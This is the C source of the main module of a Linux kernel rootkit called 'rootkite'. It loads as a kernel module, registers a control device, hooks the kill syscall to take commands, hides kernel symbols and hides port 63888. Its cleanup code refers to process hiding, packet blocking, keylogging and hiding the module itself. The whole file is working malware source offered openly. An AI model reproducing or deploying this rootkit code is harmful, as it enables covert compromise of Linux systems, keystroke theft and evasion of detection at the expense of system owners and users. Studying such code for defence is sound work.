#include <linux/init.h> // macros to mark up functions
#include <linux/module.h> // core header for loading lkms into the kernel
#include <linux/kernel.h> // types, macros, functions for kernel
#include <linux/kallsyms.h> // functions for kallsyms actions
#include <linux/unistd.h> // syscalls macros (checks for 32 bit and defines accordinly)
#include <linux/reboot.h> // reboot function

#include "kite_init.h"
#include "kite_hook.h"
#include "kill_kite.h"
#include "device_handler.h"


MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rootkite");
MODULE_AUTHOR("NondairyDig");
MODULE_VERSION("1.0");


static void cleanup(void){
    fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
    cleanup_lists();
    misc_deregister(&controller); // deregister the device controller
    if(hide_process_active){
        switch_hide_process();
    }
    if(packet_blocker){
        switch_net_hook();
    }
    if(KEYLOG_ACTIVE){
        switch_key_logging();
    }
    if(hidden){
        show_mod();
    }
}


static int __init mod_init(void){
#ifdef KITE_DEBUG
	pr_info("Activated rootkite, Initializing & Hooking Kill\n");
    #ifdef PTREGS_SYSCALL_STUB
	pr_info("Running in 64bit mode");
    #endif
#endif
    misc_register(&controller); // register the device for interaction within filesystem
    if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
#ifdef KITE_DEBUG
	    pr_err("error hooking syscall %d\n", __NR_kill);
#endif
    }
    hide_ksyms();
    insert_node(&ports_to_hide, "63888");
    return 0;
}


static void __exit mod_exit(void){
#ifdef KITE_DEBUG
	pr_info("Cleaning Up & Exiting Rootkite\n");
#endif
    cleanup();
}


module_init(mod_init);
module_exit(mod_exit);